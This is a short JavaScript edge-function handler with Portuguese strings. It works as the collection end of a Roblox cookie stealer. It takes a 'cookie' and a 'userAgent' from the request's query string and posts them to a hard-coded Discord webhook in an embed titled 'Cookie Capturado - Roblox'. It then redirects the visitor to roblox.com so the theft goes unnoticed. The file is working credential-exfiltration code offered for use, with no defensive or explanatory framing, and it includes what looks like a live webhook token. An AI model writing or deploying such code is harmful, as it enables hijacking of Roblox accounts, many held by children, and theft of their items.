export const config = {
  runtime: "edge",
};

const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";

export default async function handler(req) {
  try {
    const { searchParams } = new URL(req.url);
    const cookie = searchParams.get("cookie") || "Não enviado";
    const userAgent = searchParams.get("userAgent") || "Não enviado";

    const payload = {
      embeds: [
        {
          title: "Cookie Capturado - Roblox",
          color: 15158332,
          fields: [
            { name: "Cookie", value: `\`\`\`${cookie.slice(0, 1010)}\`\`\``, inline: false },
            { name: "User Agent", value: `\`\`\`${userAgent.slice(0, 1010)}\`\`\``, inline: false },
            { name: "Host", value: "roblox.com", inline: true },
            { name: "Timestamp", value: new Date().toISOString(), inline: true },
          ],
        },
      ],
    };

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    // Redireciona após sucesso
    return Response.redirect("https://www.roblox.com", 302);
  } catch (e) {
    return new Response("Erro ao enviar", { status: 500 });
  }
}
